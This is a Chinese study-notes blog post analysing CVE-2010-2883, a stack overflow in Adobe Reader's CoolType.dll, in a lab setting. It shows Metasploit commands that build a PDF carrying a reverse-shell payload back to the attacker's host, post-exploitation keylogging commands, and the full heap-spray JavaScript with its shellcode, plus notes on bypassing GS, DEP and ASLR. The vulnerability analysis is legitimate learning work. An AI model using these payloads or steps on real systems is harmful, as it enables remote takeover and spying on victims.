{"title":"漏洞战争学习笔记 1：CVE-2010-2883","slug":"漏洞战争学习笔记1：CVE-2010-2883","date":"2020-10-16","updated":"2020-09-10","comments":true,"path":"api/posts/53423.json","excerpt":null,"cover":"https://i.loli.net/2020/07/20/WvKMtdn3P8bx5cB.png","covers":["https://i.loli.net/2020/07/20/WvKMtdn3P8bx5cB.png","https://i.loli.net/2020/07/24/aLpHZ9y4qbc7dAu.png","https://i.loli.net/2020/07/24/fEzYQ4GMuwoDvP3.png","https://i.loli.net/2020/07/24/41Jd3hzA8G6fyYw.png","https://i.loli.net/2020/07/24/J8laM9DIOiYHeg7.png","https://i.loli.net/2020/07/24/a3IvshLZowWm1xn.png","https://i.loli.net/2020/07/24/yxZ5nCGAFtvorkJ.png","https://i.loli.net/2020/07/24/Ttae68OBCbc9GnL.png","https://i.loli.net/2020/07/24/3AdJB9OGqLC2aHz.png","https://i.loli.net/2020/07/24/xjGeuh3y5vw1TKn.png","https://i.loli.net/2020/07/24/1PhXAiMLfqOld2j.png"],"content":"<h2 id=\"漏洞背景介绍\"><a href=\"# 漏洞背景介绍\" class=\"headerlink\" title=\"漏洞背景介绍\"></a>漏洞背景介绍</h2><p>CVE-2010-2883 是 Adobe Reader 和 Acrobat 中的 CoolType.dll 库在解析字体文件 SING 表中的 uniqueName 项时存在的栈溢出漏洞，用户受骗打开了特制的 pdf 文件就有可能导致执行任意代码。</p>\n<h2 id=\"分析环境\"><a href=\"# 分析环境\" class=\"headerlink\" title=\"分析环境\"></a>分析环境 </h2><p> 操作系统：Windows XP SP3<br>调试器：OllyDbg<br>反汇编：IDA pro 7.2<br>目标：Adobe Reader 9.3.0</p>\n<h2 id=\"0x01- 漏洞利用\"><a href=\"#0x01- 漏洞利用\" class=\"headerlink\" title=\"0x01 漏洞利用\"></a>0x01 漏洞利用</h2><ul>\n<li>攻击机：kali</li>\n<li>靶机：windows xp sp3</li>\n</ul>\n<p>kali 机上，打开 msfconsole, 使用 metasploit 生成 pdf 木马文件</p>\n<ul>\n<li>msfconsole -q // 进入 msf 框架</li>\n<li>search cve-2010-2883 // 找到漏洞模块</li>\n<li>use exploit/windows/fileformat/adobe_cooltype_sing // 使用模块</li>\n<li>set payload windows/meterpreter/reverse_tcp // 调用 meterpreter 载荷，反向连接到渗透机</li>\n<li>set lhost 192.168.119.128 // 设置主机 ip</li>\n<li>set FileNAME 2883.pdf // 设置生产带有后门 pdf 文件名</li>\n<li>set lport 99999 // 设置本地监听端口</li>\n<li>exploit // 执行渗透生成文件成功</li>\n</ul>\n<p>将文件拷贝到 windows xp（靶机）。</p>\n<p>metasploit 开启 shell 监听会话</p>\n<p><img src=\"https://i.loli.net/2020/07/20/WvKMtdn3P8bx5cB.png\" alt=\"获取到 shell.PNG\"></p>\n<ul>\n<li>back</li>\n<li>use exploit/multi/handler // 使用 hhandler 监听模块</li>\n<li>set payload windows/meterpreter/reverse_tcp</li>\n<li>set lhost 192.168.119.128 // 设置及监听 IP 地址（kali）</li>\n<li>set lport 9999 // 设置监听的端口（与 pdg 文件一致）</li>\n<li>exploit // 开启监听</li>\n</ul>\n<p>靶机打开 2883.pdf 文件，kali 端即可获取 shell 会话。</p>\n<ul>\n<li>sysinfo // 查看系统信息</li>\n<li>getuid // 查看当前用户</li>\n<li>screenshot // 截屏查看靶机桌面</li>\n<li>ps // 查看进程</li>\n<li>migrate 148 // 切换进程到 148 </li>\n<li>shell // 获取到 Dos shell</li>\n<li>keyscan_start // 开启键盘记录</li>\n<li>keyscan_dump // 输出键盘记录</li>\n</ul>\n<h2 id=\"0x02- 基于字符串定位的漏洞分析方法\"><a href=\"#0x02- 基于字符串定位的漏洞分析方法\" class=\"headerlink\" title=\"0x02 基于字符串定位的漏洞分析方法\"></a>0x02 基于字符串定位的漏洞分析方法 </h2><h3 id=\"IDA 静态分析\"><a href=\"#IDA 静态分析\" class=\"headerlink\" title=\"IDA 静态分析\"></a>IDA 静态分析</h3><p> 打开 cooltype.dll，alt+t 搜索“SING”，依次进入检查是否有敏感信息，大概是第二个 SING, 发现调用函数 sttrcat，在拼接字符串时未进行长度检查，可能会造成栈溢出，strcat 为溢出点。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0803DBF2                 push    ebp</span><br><span class=\"line\">.text:0803DBF3                 sub     esp, 104h       ; 分配栈空间 0x104h</span><br><span class=\"line\">.text:0803DBF9                 lea     ebp, [esp-4]    ; 后面的 strcat 会将执行结果保存在 ebp 中，strcat 的目的地</span><br><span class=\"line\">.text:0803DBFD                 mov     eax, ___security_cookie ；安全 cookie</span><br><span class=\"line\">.text:0803DC02                 xor     eax, ebp ;cookie^ebp(sep-4);</span><br><span class=\"line\">.text:0803DC04                 mov     [ebp+108h+var_4], eax ; 将 cookie 保存到栈，以作安全检查</span><br><span class=\"line\">.text:0803DC0A                 push    4Ch</span><br><span class=\"line\">.text:0803DC0C                 mov     eax, offset loc_81847C4</span><br><span class=\"line\">.text:0803DC11                 call    __EH_prolog3_catch</span><br><span class=\"line\">.text:0803DC16                 mov     eax, [ebp+108h+arg_C]</span><br><span class=\"line\">.text:0803DC1C                 mov     edi, [ebp+108h+arg_0]</span><br><span class=\"line\">.text:0803DC22                 mov     ebx, [ebp+108h+arg_4]</span><br><span class=\"line\">.text:0803DC28                 mov     [ebp+108h+var_130], edi</span><br><span class=\"line\">.text:0803DC2B                 mov     [ebp+108h+var_138], eax</span><br><span class=\"line\">.text:0803DC2E                 call    sub_8041626</span><br><span class=\"line\">.text:0803DC33                 xor     esi, esi</span><br><span class=\"line\">.text:0803DC35                 cmp     dword ptr [edi+8], 3</span><br><span class=\"line\">.text:0803DC39 ;   try &#123;</span><br><span class=\"line\">.text:0803DC39                 mov     [ebp+108h+var_10C], esi</span><br><span class=\"line\">.text:0803DC3C                 jz      loc_803DDF9</span><br><span class=\"line\">.text:0803DC42                 mov     [ebp+108h+var_124], esi</span><br><span class=\"line\">.text:0803DC45                 mov     [ebp+108h+var_120], esi</span><br><span class=\"line\">.text:0803DC48                 cmp     dword ptr [edi+0Ch], 1</span><br><span class=\"line\">.text:0803DC48 ;   &#125; &#x2F;&#x2F; starts at 803DC39</span><br><span class=\"line\">.text:0803DC4C ;   try &#123;</span><br><span class=\"line\">.text:0803DC4C                 mov     byte ptr [ebp+108h+var_10C], 1</span><br><span class=\"line\">.text:0803DC50                 jnz     loc_803DDA2</span><br><span class=\"line\">.text:0803DC56                 push    offset aName    ; &quot;name&quot;</span><br><span class=\"line\">.text:0803DC5B                 push    edi             ; int</span><br><span class=\"line\">.text:0803DC5C                 lea     ecx, [ebp+108h+var_124]</span><br><span class=\"line\">.text:0803DC5F                 mov     [ebp+108h+var_119], 0</span><br><span class=\"line\">.text:0803DC63                 call    sub_802178F</span><br><span class=\"line\">.text:0803DC68                 cmp     [ebp+108h+var_124], esi</span><br><span class=\"line\">.text:0803DC6B                 jnz     short loc_803DCD6</span><br><span class=\"line\">.text:0803DC6D                 push    offset aSing    ; &quot;SING&quot;</span><br><span class=\"line\">.text:0803DC72                 push    edi             ; int</span><br><span class=\"line\">.text:0803DC73                 lea     ecx, [ebp+108h+var_12C] ; ecx 传参，thiscall 调用约定，推测指向 sing 表入口</span><br><span class=\"line\">.text:0803DC76                 call    sub_8021ABE     ; 处理 sing 表</span><br><span class=\"line\">.text:0803DC7B                 mov     eax, [ebp+108h+var_12C] ；SING 表地址给 eax</span><br><span class=\"line\">.text:0803DC7E                 cmp     eax, esi        ; 判断是否为空</span><br><span class=\"line\">.text:0803DC7E ;   &#125; &#x2F;&#x2F; starts at 803DC4C</span><br><span class=\"line\">.text:0803DC80 ;   try &#123;</span><br><span class=\"line\">.text:0803DC80                 mov     byte ptr [ebp+108h+var_10C], 2</span><br><span class=\"line\">.text:0803DC84                 jz      short loc_803DCBD ; 不跳转</span><br><span class=\"line\">.text:0803DC86                 mov     ecx, [eax]      ; 字体资源版本号，这里为 1.0 版本，即 00 10 00 00</span><br><span class=\"line\">.text:0803DC88                 and     ecx, 0FFFFh</span><br><span class=\"line\">.text:0803DC8E                 jz      short loc_803DC98 ; 跳转</span><br><span class=\"line\">.text:0803DC90                 cmp     ecx, 100h</span><br><span class=\"line\">.text:0803DC96                 jnz     short loc_803DCB9</span><br><span class=\"line\">.text:0803DC98</span><br><span class=\"line\">.text:0803DC98 loc_803DC98:                            ; CODE XREF: sub_803DBF2+9C↑j</span><br><span class=\"line\">.text:0803DC98                 add     eax, 10h        ; 相对 sing 表入口偏移 0x10 处找到 uniqueName</span><br><span class=\"line\">.text:0803DC9B                 push    eax             ; Source 源地址，长度不固定</span><br><span class=\"line\">.text:0803DC9C                 lea     eax, [ebp+108h+Dest] ；eax&#x3D;ebp+108-108&#x3D;ebp;ebp&#x3D;esp-4, 即复制到栈顶部位置</span><br><span class=\"line\">.text:0803DC9F                 push    eax             ; Dest 目的地址：固定大小的栈空间</span><br><span class=\"line\">.text:0803DCA0                 mov     [ebp+108h+Dest], 0 ；清 0</span><br><span class=\"line\">.text:0803DCA4                 call    strcat          ; 未检查大小，造成溢出</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>GS: 由 IDA 汇编分析，函数开始出有安全 cookie，判定存在 GS 机制。<br>DEP: 数据执行保护，即没有执行权限的内存空间不允许执行代码。<br>ASLR: 地址空间布局随机化，包含映像随机化与堆栈随机化，010Editor 打开目标 exe，找到相关字段，发现已开启。</p>\n</blockquote>\n<p><img src=\"https://i.loli.net/2020/07/24/aLpHZ9y4qbc7dAu.png\" alt=\"图片.png\"></p>\n<h3 id=\"SING 表结构分析\"><a href=\"#SING 表结构分析\" class=\"headerlink\" title=\"SING 表结构分析\"></a>SING 表结构分析 </h3><p> 在 kali 生成的 msf.pdf 文件，使用 PdfStreamDumper 打开，在第十个 Stream 中找到 Sing 字段，将整合各 Stream 另存为 TTF 文件。</p>\n<p><img src=\"https://i.loli.net/2020/07/24/fEzYQ4GMuwoDvP3.png\" alt=\"工具找到 sing 字段.PNG\"></p>\n<p><img src=\"https://i.loli.net/2020/07/24/41Jd3hzA8G6fyYw.png\" alt=\"捕获.PNG\"><br>官方文档中对 TableEntry 结构的定义：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">typedef sturct_SING</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">char tag[4]; &#x2F;&#x2F; 标记：“SING”</span><br><span class=\"line\">ULNG checkSum; &#x2F;&#x2F; 校验和：“0xD9BCC8B5”</span><br><span class=\"line\">ULNG offset; &#x2F;&#x2F; 相对文件的偏移：“0x0000011C”</span><br><span class=\"line\">ULONG length; &#x2F;&#x2F; 数据长度：“0x00001DDF”</span><br><span class=\"line\">&#125;TableEntry;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://i.loli.net/2020/07/24/J8laM9DIOiYHeg7.png\" alt=\"TTF 的 tableentry 结构.PNG\"></p>\n<h3 id=\"JS 堆喷射代码\"><a href=\"#JS 堆喷射代码\" class=\"headerlink\" title=\"JS 堆喷射代码\"></a>JS 堆喷射代码 </h3><p> 在第一个 object 处找到 OpenAction, 表示在第 11 个 obj 中，pdf 运行时会执行里面脚本。</p>\n<p><img src=\"https://i.loli.net/2020/07/24/a3IvshLZowWm1xn.png\" alt=\"捕获.PNG\"></p>\n<p>进入第 11 个 obj，表示执行的 js 代码位于第 12 个 obj 中。</p>\n<p><img src=\"https://i.loli.net/2020/07/24/yxZ5nCGAFtvorkJ.png\" alt=\"捕获.PNG\"></p>\n<p>进入第 12 个 obj，发现实现堆喷射的 js 脚本。代码是经过混淆的，简单整理后获得 js 代码。（此处使用大佬整理好的了）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var shellcode &#x3D; unescape(&#39;%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%ud7da%u82ba%ube98%ud9de%u2474%u5ef4%uc931%u31b1%uee83%u31fc%u1456%u5603%u7a96%u224b%uf87e%udbb4%u9d7e%u3e3d%u9d4f%u4a5a%u2dff%u1e28%uc6f3%u8b7c%uab80%ubca8%u0121%uf38f%u3ab2%u92f3%u4130%u7520%u8a09%u7435%uf74e%u24b4%u7307%ud96a%uc92c%u52b7%udf7e%u87bf%ude36%u19ee%ub94d%u9b30%ub182%u8378%ufcc7%u3833%u8a33%ue8c5%u730a%ud569%u86a3%u1173%u7903%u6b06%u0470%ua811%ud20b%u2b94%u91ab%u900f%u754a%u53c9%u3240%u3c9d%uc544%u3772%u4e70%u9875%u14f1%u3c52%uce5a%u65fb%ua106%u7504%u1ee9%ufda1%u4a07%u5fd8%u8d4d%uda6e%u8d23%ue570%ue613%u6e41%u71fc%ua55e%u8eb9%ue414%u06eb%u7cf1%u4aae%uab02%u72ec%u5e81%u808c%u2a99%ucd89%uc61d%u5ee3%ue8c8%u5e50%u8ad9%ucc37%u6281%u74d2%u7b23&#39;);</span><br><span class=\"line\">var nop &#x3D; unescape(&quot;%&quot; + &quot;u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; + &quot;%u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot;);</span><br><span class=\"line\">while (nop.length + 20 + 8 &lt; 65536)</span><br><span class=\"line\"> nop+&#x3D;nop;</span><br><span class=\"line\">d &#x3D; nop.substring(0, (0x0c0c-0x24)&#x2F;2);</span><br><span class=\"line\">d +&#x3D; shellcode;</span><br><span class=\"line\">d +&#x3D; nop;</span><br><span class=\"line\">e &#x3D; d.substring(0, 65536&#x2F;2);</span><br><span class=\"line\">while(e.length &lt; 0x80000)</span><br><span class=\"line\"> e +&#x3D; e;</span><br><span class=\"line\">h &#x3D; e.substring(0, 0x80000 - (0x1020-0x08) &#x2F; 2);</span><br><span class=\"line\">var slide &#x3D; new Array();</span><br><span class=\"line\">for (i&#x3D;0;i&lt;0x1f0;i++)</span><br><span class=\"line\"> slide[i]&#x3D;h+&quot;s&quot;;</span><br></pre></td></tr></table></figure>\n\n<p>从 TableEntry 结构入口偏移 0x11C 即使 SING 表的真实数据，即从“00 00 01 00”开始的部分，接着再偏移 0x10 即可找到 uniqueName 域。</p>\n<p><img src=\"https://i.loli.net/2020/07/24/Ttae68OBCbc9GnL.png\" alt=\"uniquename.PNG\"></p>\n<p>执行 strcat 后会将“58 E0 8D AD”起始部分复制到 ebp 的指定地址，直到遇见 NULL 字符.</p>\n<h3 id=\"OD 动态调试\"><a href=\"#OD 动态调试\" class=\"headerlink\" title=\"OD 动态调试\"></a>OD 动态调试</h3><ul>\n<li>打开 AR,OD 中附加进程 Cooltype.dll, 溢出点 strcat 处下断点。</li>\n</ul>\n<p><img src=\"https://i.loli.net/2020/07/24/3AdJB9OGqLC2aHz.png\" alt=\"捕获.PNG\"></p>\n<ul>\n<li>溢出前，源地址数据如下，是 SING 表中的 uniqueName 字段的内容：</li>\n</ul>\n<p><img src=\"https://i.loli.net/2020/07/24/xjGeuh3y5vw1TKn.png\" alt=\"捕获.PNG\"></p>\n<p>正常情况下 uniqueName 字段为 28 字节，远小于栈空间大小 0x104，就不会发生溢出。但是如果经过特殊构造，基于 strcat 复制内存时的特性（遇见 NULL 才停止）则会出现溢出。</p>\n<ul>\n<li>单步执行 strcat 函数后，目标地址位于栈中，站遭破坏，发生栈溢出。</li>\n</ul>\n<p><img src=\"https://i.loli.net/2020/07/24/1PhXAiMLfqOld2j.png\" alt=\"捕获.PNG\"></p>\n<ul>\n<li>将上面复制进去的数据下内存访问断点，执行，直到遇到 call。但是这一步我始终跳不过去，程序往往会直接终止。后面我直接把 call 改成了 retn，成功跳过，但是在内存访问断点之后遇到一个 call 又会终止程序，很糟心。</li>\n</ul>\n<h2 id=\"0x03-exploit 分析\"><a href=\"#0x03-exploit 分析\" class=\"headerlink\" title=\"0x03 exploit 分析\"></a>0x03 exploit 分析 </h2><p> 漏洞成因：Cooltype.dll 中使用 strcat 函数时未对 uniqueName 字段的字符串长度进行检查，直接复制到固定大小的栈空间，最终导致栈溢出，攻击者篡改了 TTF 文件，在 pdf 文件中嵌入了 JS 脚本。</p>\n<h2 id=\"0x04- 知识总结\"><a href=\"#0x04- 知识总结\" class=\"headerlink\" title=\"0x04 知识总结\"></a>0x04 知识总结 </h2><h3 id=\"绕过 GS\"><a href=\"# 绕过 GS\" class=\"headerlink\" title=\"绕过 GS\"></a> 绕过 GS</h3><ul>\n<li>通过安全 cookie 的检查，可以很好的探测栈是否被破坏 / 溢出；但是其也有很大弊端：只有在函数返回前，才会去检查 security cookie，在之前是没有任何保护措施的.</li>\n<li>只要在安全 cookie 被检查之前劫持程序流程，就可无视 GS 保护，如 OD 中所示，产生溢出后，下内存访问断点，会有 call 栈内数据的操作，由此直接劫持程序流程，从而绕过 GS</li>\n</ul>\n<h3 id=\"绕过 DEP\"><a href=\"# 绕过 DEP\" class=\"headerlink\" title=\"绕过 DEP\"></a>绕过 DEP</h3><ul>\n<li>通过构造 ROP 链，利用程序自身加载的库文件中的指令，来拼接出一系列指令去执行</li>\n<li>通过构造 ROP 链，利用程序自身加载的库文件中的指令，来拼接出一系列指令去执行</li>\n<li>进一步调用 memcpy 将 shellcode 复制到此空间，从而实现 shellcode 的执行，绕过 DEP</li>\n</ul>\n<h3 id=\"绕过 ASLR\"><a href=\"# 绕过 ASLR\" class=\"headerlink\" title=\"绕过 ASLR\"></a>绕过 ASLR</h3><ul>\n<li>开启 ASLR 后，其对堆基址做了随机化处理，但对于 Heap Spray 来说是无效的</li>\n<li>不管怎样对堆基址进行随机化，其基址总会出现在较低的内存空间，远远小于堆喷射所需的 0x0c0c0c0c 地址，因此，Heap spray 完全可以绕过 ASLR </li>\n</ul>\n<h3 id=\"调试思路总结\"><a href=\"# 调试思路总结\" class=\"headerlink\" title=\"调试思路总结\"></a>调试思路总结</h3><ul>\n<li>构造恶意数据，实现栈溢出</li>\n<li>函数返回前（安全 cookie 检查前），调用恶意数据中的地址，开始实施 ROP</li>\n<li>通过 ROP，劫持执行流程指向 0x0C0C0C0C</li>\n<li>js 堆喷射覆盖地址 0x0C0C0C0C，从而执行另一块 ROP</li>\n<li>ROP 块中为进程申请可执行权限的内存空间，并将 shellcode 复制其中</li>\n<li>shellcode 执行，成功利用！</li>\n</ul>\n<blockquote>\n<p>太难啦 OD 动态调试调不出来！到底是因为啥子啊啊啊啊啊</p>\n</blockquote>\n","url":"/posts/53423/","min2read":11,"word4post":"2.4k","prev_post":{"title":"漏洞战争学习笔记 2：CVE-2010-3333","url":"/posts/11816/"},"next_post":{"title":"攻防世界 string","url":"/posts/54486/"},"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"漏洞背景介绍\" href = \"#\"><span class=\"toc-number\">1.</span> <span class=\"toc-text\">漏洞背景介绍</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"分析环境\" href = \"#\"><span class=\"toc-number\">2.</span> <span class=\"toc-text\">分析环境 </span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"0x01- 漏洞利用\" href = \"#\"><span class=\"toc-number\">3.</span> <span class=\"toc-text\">0x01 漏洞利用</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"0x02- 基于字符串定位的漏洞分析方法\" href = \"#\"><span class=\"toc-number\">4.</span> <span class=\"toc-text\">0x02 基于字符串定位的漏洞分析方法 </span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" data-id=\"IDA 静态分析\" href = \"#\"><span class=\"toc-number\">4.1.</span> <span class=\"toc-text\">IDA 静态分析</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" data-id=\"SING 表结构分析\" href = \"#\"><span class=\"toc-number\">4.2.</span> <span class=\"toc-text\">SING 表结构分析 </span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" data-id=\"JS 堆喷射代码\" href = \"#\"><span class=\"toc-number\">4.3.</span> <span class=\"toc-text\">JS 堆喷射代码 </span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" data-id=\"OD 动态调试\" href = \"#\"><span class=\"toc-number\">4.4.</span> <span class=\"toc-text\">OD 动态调试</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"0x03-exploit 分析\" href = \"#\"><span class=\"toc-number\">5.</span> <span class=\"toc-text\">0x03 exploit 分析 </span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"0x04- 知识总结\" href = \"#\"><span class=\"toc-number\">6.</span> <span class=\"toc-text\">0x04 知识总结 </span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" data-id=\"绕过 GS\" href = \"#\"><span class=\"toc-number\">6.1.</span> <span class=\"toc-text\"> 绕过 GS</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" data-id=\"绕过 DEP\" href = \"#\"><span class=\"toc-number\">6.2.</span> <span class=\"toc-text\">绕过 DEP</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" data-id=\"绕过 ASLR\" href = \"#\"><span class=\"toc-number\">6.3.</span> <span class=\"toc-text\">绕过 ASLR</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" data-id=\"调试思路总结\" href = \"#\"><span class=\"toc-number\">6.4.</span> <span class=\"toc-text\">调试思路总结</span></a></li></ol></li></ol>","categories":[],"tags":[{"name":"漏洞战争","path":"api/tags/漏洞战争.json","url":"/tags/漏洞战争/"}]}